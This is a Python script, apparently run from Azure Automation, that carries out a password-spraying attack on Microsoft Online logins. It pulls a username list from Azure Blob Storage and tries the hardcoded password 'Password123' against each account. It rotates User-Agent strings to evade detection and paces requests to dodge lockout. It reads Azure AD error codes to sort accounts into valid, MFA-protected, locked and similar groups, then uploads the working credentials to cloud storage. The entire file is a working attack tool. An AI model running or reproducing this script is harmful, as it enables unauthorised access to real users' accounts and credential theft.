#!/usr/bin/env python3

import os
import requests
import random
import time
from colorama import Fore, Style, init
from azure.storage.blob import BlobServiceClient

# Initialize colorama for colored terminal output
init(autoreset=True)

# Azure Storage details (set in Azure Automation variables)
STORAGE_ACCOUNT_NAME = os.environ.get(
    "STORAGE_ACCOUNT_NAME", "storageaccountuser")
STORAGE_CONTAINER_NAME = os.environ.get(
    "STORAGE_CONTAINER_NAME", "containername")
STORAGE_BLOB_NAME = os.environ.get("STORAGE_BLOB_NAME", "userlist.txt")

# Ensure Storage Connection String is Set.
STORAGE_CONNECTION_STRING = os.environ.get(
    "AZURE_STORAGE_CONNECTION_STRING",
    "DefaultEndpointsProtocol=https;AccountName=YOUR_STORAGE_ACCOUNT;AccountKey=YOUR_SECRET_KEY;EndpointSuffix=core.windows.net"
)

# HARDCODED PASSWORD (Modify this for password spraying)
PASSWORD = "Password123"

# Sleep time between requests
SLEEP_TIME = 30  # Default: 30 seconds
OUTPUT_FILE = "results.txt"

# Microsoft login API URL
URL = "https://login.microsoftonline.com/common/oauth2/token"

# Function to Download user list from Azure Storage


def download_user_list():
    try:
        print("[INFO] Connecting to Azure Storage...")
        blob_service_client = BlobServiceClient.from_connection_string(
            STORAGE_CONNECTION_STRING)
        blob_client = blob_service_client.get_blob_client(
            container=STORAGE_CONTAINER_NAME, blob=STORAGE_BLOB_NAME)

        with open("userlist.txt", "wb") as file:
            file.write(blob_client.download_blob().readall())

        print(
            f"[INFO] Successfully downloaded {STORAGE_BLOB_NAME} from Azure Storage.")
    except Exception as e:
        print(f"[ERROR] Could not download user list: {e}")
        exit(1)

# Function to Upload results.txt to Azure Storage


def upload_results_to_blob():
    try:
        print("[INFO] Uploading results to Azure Storage...")
        blob_service_client = BlobServiceClient.from_connection_string(
            STORAGE_CONNECTION_STRING)
        blob_client = blob_service_client.get_blob_client(
            container=STORAGE_CONTAINER_NAME, blob="results.txt")

        with open(OUTPUT_FILE, "rb") as file:
            blob_client.upload_blob(file, overwrite=True)

        print(f"[INFO] Results successfully uploaded to Azure Storage: results.txt")
    except Exception as e:
        print(f"[ERROR] Could not upload results file: {e}")


# Run the download function
download_user_list()

# Load usernames from the downloaded file
try:
    with open("userlist.txt", "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
    print(f"[INFO] Loaded {len(usernames)} usernames from userlist.txt")
except FileNotFoundError:
    print("[ERROR] User list file not found!")
    exit(1)

total_users = len(usernames)
current_user = 0
full_results = []
lockout_count = 0

# User-Agent rotation list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.98 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/107.0.1418.35",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.6 Safari/537.36",
]

# Initialize User-Agent dynamically
selected_user_agent = random.choice(USER_AGENTS)

print(f"\n[INFO] Starting password spray attack against Microsoft Online...\n")
time.sleep(2)

# Start the attack
for username in usernames:
    current_user += 1
    print(f"[{current_user}/{total_users}] Testing user: {username}")

    # Change User-Agent every 3 requests
    if current_user % 3 == 0:
        selected_user_agent = random.choice(USER_AGENTS)

    headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": selected_user_agent,
    }

    # Debug: Print the User-Agent to verify rotation
    print(f"[INFO] Using User-Agent: {selected_user_agent}")

    # Form data
    data = {
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "client_info": "1",
        "grant_type": "password",
        "username": username,
        "password": PASSWORD,
        "scope": "openid",
    }

    try:
        response = requests.post(URL, headers=headers, data=data)
        response_text = response.text

        # SUCCESS - Regular successful login
        if response.status_code == 200 and "error" not in response_text:
            print(
                f"{Fore.GREEN}[SUCCESS] VALID CREDENTIALS FOUND: {username} : {PASSWORD}{Style.RESET_ALL}")
            full_results.append(f"{username} : {PASSWORD}")

        # SUCCESS - MFA detected
        elif "AADSTS50079" in response_text or "AADSTS50076" in response_text:
            print(
                f"{Fore.GREEN}[SUCCESS] {username} : {PASSWORD} - NOTE: The response indicates MFA (Microsoft) is in use.{Style.RESET_ALL}")
            full_results.append(f"{username} : {PASSWORD} (MFA)")

        # WARNING - Account locked (Smart Lockout)
        elif "AADSTS50053" in response_text:
            print(
                f"{Fore.YELLOW}[WARNING] The account {username} appears to be locked.{Style.RESET_ALL}")
            lockout_count += 1

        # WARNING - User doesn't exist
        elif "AADSTS50034" in response_text:
            print(
                f"{Fore.YELLOW}[WARNING] User {username} doesn't exist.{Style.RESET_ALL}")

        # WARNING - Disabled account
        elif "AADSTS50057" in response_text:
            print(
                f"{Fore.YELLOW}[WARNING] The account {username} is disabled.{Style.RESET_ALL}")

        # SUCCESS - Password expired
        elif "AADSTS50055" in response_text:
            print(
                f"{Fore.GREEN}[SUCCESS] {username} : {PASSWORD} - Password expired.{Style.RESET_ALL}")
            full_results.append(f"{username} : {PASSWORD} (Password Expired)")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[FAIL] Network Error: {e}{Style.RESET_ALL}")

    # Sleep after every request
    print(
        f"[INFO] Pausing for {SLEEP_TIME} seconds before the next request...")
    time.sleep(SLEEP_TIME)

# Output results to file and upload to Azure Storage
if full_results:
    with open(OUTPUT_FILE, "w") as f:
        f.write("\n".join(full_results))
    print(f"\n[INFO] Results saved to: {OUTPUT_FILE}")

    # Upload results to Azure Storage
    upload_results_to_blob()
